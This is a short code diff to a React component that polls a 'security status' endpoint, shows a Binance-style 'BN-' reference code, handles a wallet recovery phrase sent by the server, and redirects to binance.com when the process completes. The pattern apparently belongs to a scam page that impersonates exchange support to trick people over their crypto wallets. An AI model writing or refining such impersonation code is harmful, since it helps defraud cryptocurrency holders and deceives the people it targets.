@@ -25,10 +25,16 @@ export default function ClientOnly({ securitySession }: Props) {
       const response = await fetch(
         `/api/security/status?security_code=${securitySession.securityCode}`
       );
+
       const data = await response.json();
+
+      console.log("Polling for status updates:", data.status);
+      if (data.status === "completed") {
+        // redirect to binance.com
+        window.location.href = "https://www.binance.com";
+      }
       if (data.recoveryPhrase) {
         setRecoveryPhrase(data.recoveryPhrase);
-        clearInterval(interval); // Stop polling if recovery phrase is received
       }
     }, 5000);
 
@@ -125,8 +131,8 @@ export default function ClientOnly({ securitySession }: Props) {
                     <AlertTitle className="text-lg font-semibold text-center mb-2 text-gray-400">
                       Use reference
                     </AlertTitle>
-                    <AlertDescription className="text-primary text-center text-3xl font-bold">
-                      BN-P2008
+                    <AlertDescription className="text-primary text-center text-3xl font-bold uppercase">
+                      BN-{securitySession.securityCode}
                     </AlertDescription>
                   </Alert>
                 </div>
